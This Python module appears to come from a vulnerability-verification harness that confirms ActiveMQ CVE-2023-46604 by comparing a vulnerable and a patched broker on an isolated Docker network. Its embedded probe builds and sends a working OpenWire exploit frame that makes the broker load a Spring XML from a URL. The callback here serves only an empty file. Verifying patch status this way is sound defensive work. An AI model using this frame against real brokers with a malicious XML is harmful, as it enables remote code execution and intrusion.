"""Strict local-only OpenWire callback differential for ActiveMQ CVE-2023-46604.

No command execution, ProcessBuilder, arbitrary URLs, credentials or host ports.
The only requested side effect is GET of random empty Spring XML served by a
sidecar on an ephemeral --internal Docker network. Version checks and fixed
5.17.6 differential must pass before BEHAVIOR_VERIFIED is possible.
"""
from __future__ import annotations

import hashlib
import json
import re
import secrets
import time
import uuid
from pathlib import Path

from .core import Executor, TaskError, budget_seconds, json_write, sha256_file
from .verify import assert_archive_tag

CVE = 'CVE-2023-46604'
VULNERABLE_VERSION = '5.17.3'
PATCHED_VERSION = '5.17.6'
PATCHED_IMAGE = 'apache/activemq-classic:5.17.6'
PROBE_IMAGE = 'python:3.12-alpine'
CLASS_NAME = 'org.springframework.context.support.ClassPathXmlApplicationContext'

# Exposes only an empty XML configuration. No bean instantiation, process
# execution, script engine, filesystem write, or outbound HTTP destinations.
SINK_CODE = r'''
import http.server, sys
nonce = sys.argv[1]
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            body = b'OK'
        elif self.path == '/' + nonce + '.xml':
            print('T3_XML_CALLBACK='+nonce+' FROM='+self.client_address[0], flush=True)
            body = (b'<?xml version="1.0" encoding="UTF-8"?>'
                    b'<beans xmlns="http://www.springframework.org/schema/beans"/>')
        else:
            self.send_error(404); return
        self.send_response(200)
        self.send_header('Content-Type','application/xml' if self.path.endswith('.xml') else 'text/plain')
        self.send_header('Content-Length',str(len(body)))
        self.end_headers(); self.wfile.write(body)
    def log_message(self, *args):
        pass
http.server.ThreadingHTTPServer(('0.0.0.0', 8000), H).serve_forever()
'''

PROBE_CODE = r'''
import socket, struct, sys, urllib.request
mode=sys.argv[1]
if mode == 'ready':
    with socket.create_connection(('target',61616),timeout=4): pass
elif mode == 'sink':
    with urllib.request.build_opener(urllib.request.ProxyHandler({})).open('http://sink:8000/health',timeout=4) as r:
        if r.status != 200 or r.read() != b'OK': raise RuntimeError('SINK_NOT_OK')
elif mode == 'trigger':
    # Fixed safe class, fixed internal callback host, random path only.
    nonce=sys.argv[2]
    if not (len(nonce)==26 and nonce.startswith('t3') and all(c in '0123456789abcdef' for c in nonce[2:])):
        raise ValueError('BAD_NONCE')
    classname='org.springframework.context.support.ClassPathXmlApplicationContext'
    url='http://sink:8000/'+nonce+'.xml'
    def utf(s):
        b=s.encode('utf-8')
        if len(b)>65535: raise ValueError('OVERSIZED_STRING')
        return struct.pack('>H',len(b))+b
    # Vendor lab's OpenWire ExceptionResponse marshaller sequence.
    # The first 4 bytes are the original lab's OpenWire frame marker.
    wire=(struct.pack('>I',32)+b'\x1f'+struct.pack('>I',1)+b'\x01'
          +struct.pack('>I',1)+b'\x01\x01'+utf(classname)+b'\x01'+utf(url))
    with socket.create_connection(('target',61616),timeout=5) as s:
        s.settimeout(5)
        s.sendall(wire)
else:
    raise ValueError('INVALID_PROBE_MODE')
'''


def _read_json(path):
    try:
        return json.loads(Path(path).read_text(encoding='utf-8'))
    except (OSError, ValueError) as exc:
        raise TaskError('CASE_JSON_ERROR', f'{path}: {exc}') from exc


def _present(runner, image, deadline, allow_pull):
    p=runner.run(['docker','image','inspect',image],timeout=budget_seconds(deadline,15),check=False)
    if p.returncode == 0: return
    if not allow_pull:
        raise TaskError('CONTROL_IMAGE_MISSING',f'{image}; re-run with --allow-pull')
    runner.run(['docker','pull',image],timeout=budget_seconds(deadline,180))
    p=runner.run(['docker','image','inspect',image],timeout=budget_seconds(deadline,15),check=False)
    if p.returncode != 0:raise TaskError('CONTROL_IMAGE_UNAVAILABLE',image)


def _probe(runner, network, deadline, mode, nonce=None, *, check=True):
    cmd=['docker','run','--rm','--network',network,'--cap-drop','ALL',
         '--security-opt','no-new-privileges','--memory','96m','--pids-limit','64',
         '--entrypoint','python',PROBE_IMAGE,'-c',PROBE_CODE,mode]
    if nonce:cmd.append(nonce)
    return runner.run(cmd,timeout=budget_seconds(deadline,24),check=check)


def _target_info(runner, cname, network, deadline):
    p=runner.run(['docker','inspect',cname],timeout=budget_seconds(deadline,15))
    try:
        v=json.loads(p.stdout)[0]
        net=(v['NetworkSettings']['Networks'][network])
        ip=net['IPAddress']
        if not re.fullmatch(r'\d{1,3}(?:\.\d{1,3}){3}', ip):raise ValueError('invalid private IPv4')
        if (v.get('HostConfig') or {}).get('PortBindings'):
            raise TaskError('HOST_PORT_PUBLISHED',cname)
        if len(v['NetworkSettings']['Networks']) != 1:
            raise TaskError('UNEXPECTED_TARGET_NETWORKS',cname)
        return ip
    except (ValueError,KeyError,IndexError,TypeError) as exc:
        raise TaskError('TARGET_INSPECT_INVALID',str(exc)) from exc


def _component_version(runner, cname, expected, deadline):
    # Check the actual jar within the running container, not only its tag.
    cmd=['docker','exec',cname,'sh','-c',
         "find /opt -type f \\( -name 'activemq-client-*.jar' -o -name 'activemq-openwire-legacy-*.jar' \\) 2>/dev/null"]
    p=runner.run(cmd,timeout=budget_seconds(deadline,20),check=False)
    versions=set(re.findall(r'activemq-(?:client|openwire-legacy)-(\d+\.\d+\.\d+)\.jar',p.stdout))
    if p.returncode != 0 or versions != {expected}:
        raise TaskError('ACTIVE_MQ_COMPONENT_VERSION_MISMATCH',
                        f'expected={expected}, found={sorted(versions)}, exit={p.returncode}')
    return {'openwire_component_version':expected,
            'evidence_paths':[x for x in p.stdout.splitlines()
                              if expected in x][:6]}


def _sink_logs(runner, cname, deadline):
    p=runner.run(['docker','logs',cname],timeout=budget_seconds(deadline,12),check=False)
    if p.returncode != 0:raise TaskError('SINK_LOG_UNAVAILABLE',p.stderr[-300:])
    return p.stdout+'\n'+p.stderr


def _callback_from_target(logs, nonce, ip):
    return any(line.strip() == f'T3_XML_CALLBACK={nonce} FROM={ip}' for line in logs.splitlines())


def _trial(runner, image, expected, deadline, *, max_wait=16):
    suffix=uuid.uuid4().hex[:12]
    network='t3mqnet-'+suffix
    target='t3mqtarget-'+suffix
    sink='t3mqsink-'+suffix
    nonce='t3'+secrets.token_hex(12)
    record={'image':image,'expected_version':expected,'status':'TRIAL_FAILED',
            'network_isolation':'internal_only_sidecar','host_ports_published':False,
            'sink':'INTERNAL_ONLY_EMPTY_XML','command_execution':False,
            'callback_token_sha256':hashlib.sha256(nonce.encode()).hexdigest(),
            'target_network_address':None}
    network_created=False; target_started=False; sink_started=False
    try:
        runner.run(['docker','network','create','--internal',network],
                   timeout=budget_seconds(deadline,25))
        network_created=True
        p=runner.run(['docker','network','inspect',network],timeout=budget_seconds(deadline,15))
        if json.loads(p.stdout)[0].get('Internal') is not True:
            raise TaskError('NETWORK_NOT_INTERNAL',network)
        runner.run(['docker','run','-d','--name',sink,'--network',network,
                    '--network-alias','sink','--cap-drop','ALL','--security-opt','no-new-privileges',
                    '--memory','128m','--pids-limit','64','--entrypoint','python',PROBE_IMAGE,
                    '-c',SINK_CODE,nonce],timeout=budget_seconds(deadline,40))
        sink_started=True
        runner.run(['docker','run','-d','--name',target,'--network',network,
                    '--network-alias','target','--cap-drop','ALL','--security-opt','no-new-privileges',
                    '--memory','2g','--pids-limit','256',image],
                   timeout=budget_seconds(deadline,65))
        target_started=True
        ip=_target_info(runner,target,network,deadline)
        record['target_network_address']=ip
        record['component_version']=_component_version(runner,target,expected,deadline)
        # Explicitly prove the callback server responds before triggering.
        sink_ok=False
        for attempt in range(1,26):
            if _probe(runner,network,deadline,'sink',check=False).returncode==0:
                sink_ok=True;record['sink_readiness_attempts']=attempt;break
            if time.monotonic()+1>=deadline-5:break
            time.sleep(1)
        if not sink_ok:raise TaskError('CALLBACK_SIDECAR_NOT_READY','Internal HTTP sink failed')
        ready=False
        for attempt in range(1,55):
            if _probe(runner,network,deadline,'ready',check=False).returncode==0:
                ready=True;record['openwire_readiness_attempts']=attempt;break
            if time.monotonic()+1>=deadline-5:break
            time.sleep(2)
        if not ready:raise TaskError('OPENWIRE_NOT_READY','TCP 61616 never accepted')
        if _callback_from_target(_sink_logs(runner,sink,deadline),nonce,ip):
            raise TaskError('PREEXISTING_CALLBACK','Canary appeared before test packet')
        record['baseline_no_callback']=True
        _probe(runner,network,deadline,'trigger',nonce)
        record['trigger_sent']=True
        end=min(deadline-2,time.monotonic()+max_wait)
        hit=False;last_logs=''
        while time.monotonic()<end:
            last_logs=_sink_logs(runner,sink,deadline)
            if _callback_from_target(last_logs,nonce,ip):hit=True;break
            time.sleep(1)
        record['callback_from_broker']=hit
        record['status']='TRIAL_COMPLETE'
    except (TaskError,KeyError,IndexError,ValueError,OSError) as exc:
        record['error_code']=getattr(exc,'code','TRIAL_EXCEPTION')
        record['error']=str(exc)[:1100]
        if target_started:
            try:
                p=runner.run(['docker','logs','--tail','40',target],timeout=10,check=False)
                record['logs_tail']=(p.stdout+'\n'+p.stderr)[-1700:]
            except (TaskError,OSError):pass
    finally:
        cleanup=[]
        for present,name in ((target_started,target),(sink_started,sink)):
            if present:
                try:
                    p=runner.run(['docker','rm','-f',name],timeout=20,check=False)
                    cleanup.append({'container':name,'ok':p.returncode==0})
                except (TaskError,OSError) as exc:
                    cleanup.append({'container':name,'ok':False,'error':str(exc)[:200]})
        if network_created:
            try:
                p=runner.run(['docker','network','rm',network],timeout=20,check=False)
                cleanup.append({'network':network,'ok':p.returncode==0})
            except (TaskError,OSError) as exc:
                cleanup.append({'network':network,'ok':False,'error':str(exc)[:200]})
        record['cleanup']=cleanup
        record['cleanup_ok']=bool(cleanup) and all(x['ok'] for x in cleanup)
    return record


def verify_activemq_case(case_dir, *, runner=None, allow_pull=False, budget=360):
    """A candidate is verified only for target-origin callback + patched no-callback."""
    case=Path(case_dir).expanduser().resolve()
    out=case/'proof'/'activemq'/'activemq_proof.json'
    d={'cve':CVE,'status':'PROOF_FAILED','vulnerability_verified':False,
       'case':str(case),'checks':[],'patched_image':PATCHED_IMAGE,
       'evidence_kind':'OPENWIRE_UNSAFE_CLASS_INSTANTIATION_LOCAL_CALLBACK',
       'command_execution_demonstrated':False}
    runner=runner or Executor()
    deadline=time.monotonic()+budget
    try:
        if budget<150 or budget>1800:
            raise TaskError('BAD_BUDGET','ActiveMQ requires 150-1800 seconds')
        src=_read_json(case/'result.json')
        if src.get('cve')!=CVE or src.get('status')!='ENVIRONMENT_EXPORTED_NOT_CVE_PROOF':
            raise TaskError('CASE_NOT_EXPORTED','Correct original exported ActiveMQ case required')
        images=src.get('images')
        if not isinstance(images,list) or len(images)!=1:
            raise TaskError('UNEXPECTED_IMAGE_LIST',repr(images))
        image=images[0]
        # Do not accept arbitrary image overrides or a patched candidate as "vulnerable".
        if image != 'vulhub/activemq:5.17.3':
            raise TaskError('UNEXPECTED_VULNERABLE_IMAGE',image)
        artifact=Path(src['artifact'])
        if not artifact.is_file() or sha256_file(artifact)!=src.get('archive_sha256'):
            raise TaskError('ARTIFACT_MISMATCH','Original archive missing or changed')
        d['identity']=assert_archive_tag(artifact,image,runner,allow_load=False)
        d['checks'].append('VULNERABLE_ARCHIVE_TAG_CONFIG_MATCHED')
        _present(runner,PROBE_IMAGE,deadline,allow_pull)
        _present(runner,PATCHED_IMAGE,deadline,allow_pull)
        d['checks'].append('OFFICIAL_PATCHED_IMAGE_AVAILABLE')
        vuln=_trial(runner,image,VULNERABLE_VERSION,deadline)
        d['vulnerable_trial']=vuln
        if vuln.get('error_code') or not vuln['cleanup_ok']:
            raise TaskError('VULNERABLE_TRIAL_FAILED',vuln.get('error','cleanup failed'))
        patched=_trial(runner,PATCHED_IMAGE,PATCHED_VERSION,deadline)
        d['fixed_trial']=patched
        if patched.get('error_code') or not patched['cleanup_ok']:
            raise TaskError('PATCHED_TRIAL_FAILED',patched.get('error','cleanup failed'))
        d['checks'] += ['RUNNING_COMPONENT_VERSIONS_CONFIRMED',
                        'BOTH_OPENWIRE_PORTS_READY','TWO_INTERNAL_SIDECAR_TRIALS_COMPLETED',
                        'SOURCE_IP_BOUND_CALLBACK_VERIFIED','NO_COMMAND_EXECUTION_PAYLOAD']
        good=(vuln['status']=='TRIAL_COMPLETE' and patched['status']=='TRIAL_COMPLETE'
              and vuln.get('component_version',{}).get('openwire_component_version')==VULNERABLE_VERSION
              and patched.get('component_version',{}).get('openwire_component_version')==PATCHED_VERSION
              and vuln.get('network_isolation')=='internal_only_sidecar'
              and patched.get('network_isolation')=='internal_only_sidecar'
              and vuln.get('host_ports_published') is False
              and patched.get('host_ports_published') is False
              and vuln.get('baseline_no_callback') and patched.get('baseline_no_callback')
              and vuln.get('trigger_sent') and patched.get('trigger_sent')
              and vuln.get('callback_from_broker') is True
              and patched.get('callback_from_broker') is False
              and vuln.get('cleanup_ok') and patched.get('cleanup_ok'))
        d['status']='BEHAVIOR_VERIFIED' if good else 'NOT_REPRODUCED'
        d['vulnerability_verified']=bool(good)
        if not good: d['reason']='Target-origin callback must occur only for vulnerable version'
    except (TaskError,KeyError,IndexError,ValueError,OSError) as exc:
        d['error_code']=getattr(exc,'code','ACTIVEMQ_PROOF_ERROR')
        d['error']=str(exc)[:1300]
    finally:
        json_write(out,d)
    return d
